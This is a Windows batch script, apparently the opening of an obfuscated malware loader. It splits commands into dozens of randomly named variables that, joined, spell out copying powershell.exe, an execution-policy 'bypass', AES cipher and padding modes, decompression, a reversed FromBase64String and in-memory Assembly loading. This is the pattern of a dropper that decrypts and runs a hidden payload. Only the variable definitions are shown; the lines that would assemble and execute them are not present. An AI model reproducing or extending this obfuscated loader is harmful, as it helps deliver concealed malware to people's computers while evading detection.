@echo off
set "hpTZnwjmqy=do"
set "rZrjLNhGcw=he"
set "jEdNSVHbKF=he"
set "tlISpHxqmz=Po"
set "VREsgVvCaC=we"
set "GLefBHEEEo=32"
set "qzPxEHShJl=ws"
set "mNFAQXLHVX=nd"
set "lvmGgrNZAl=we"
set "zGgaqrOQAk=1."
set "JeWgvRxMDj=rs"
set "YbBwdmiQjl=rS"
set "loCnYhnRVt=\W"
set "khXerRNWhD= /"
set "wKtqildcUs=xe"
set "rLzAYTwWzz=po"
set "USqaZRimol=ll"
set "OZXwzeuDgg=ow"
set "YTaQDyUwrJ=ll"
set "nuSvDeaKTF=0\"
set "QhkxhvJjjf= C"
set "hnrRgUdtLP=st"
set "EavXaqSyWi=py"
set "WuvItHdDmb=em"
set "JlxrRpQKoy=y "
set "whutSlTfbT=Sy"
set "rbjHVnPteh=.e"
set "mphhnsKlOd=\v"
set "YzFRQTVnPV=:\"
set "LYoNTbLMZl=in"
set "fWecsyigCx=co"
set "UbQkUrYCOP=Wi"
set "vFJboPraDQ=s\"
set "rVBDEbZkKM=cd"
set "OSKUsKKRGK= %~dp0"
set "IkmhKjgnlJ=yW, "
set "YMeyfhxnAy=l, 0"
set "NlJdbywzRY=em.C"
set "xsNkRWBoMK=)($H"
set "GUsERSNfAB=$qiH"
set "UXCYUtNMci=Stre"
set "bLnzXjQLQh=pher"
set "QmJjQnSBmM=gMod"
set "qjGYekYERE=.Con"
set "cCOQJGcPMK=tion"
set "AaPPiRdEGu=mory"
set "PZZkLLDZkx=]::C"
set "ZfnuRYpBDM=F'[-"
set "EaUMHDlzHe=pk.T"
set "aIVFJejxYA=sion"
set "HjkvGhXgAw=chsI"
set "JOfUWemhTY=th('"
set "DKoyIZoxGg=iHpl"
set "GxyNfTtAKN=gth)"
set "QlBKssqccP=.IO."
set "MnNvhJjyHh=hwNI"
set "SgTFktekSW=.Ass"
set "KYfehRnLQT=esaB"
set "zIQoHtJXOx=bypa"
set "OfZbGdHnZI=.Cop"
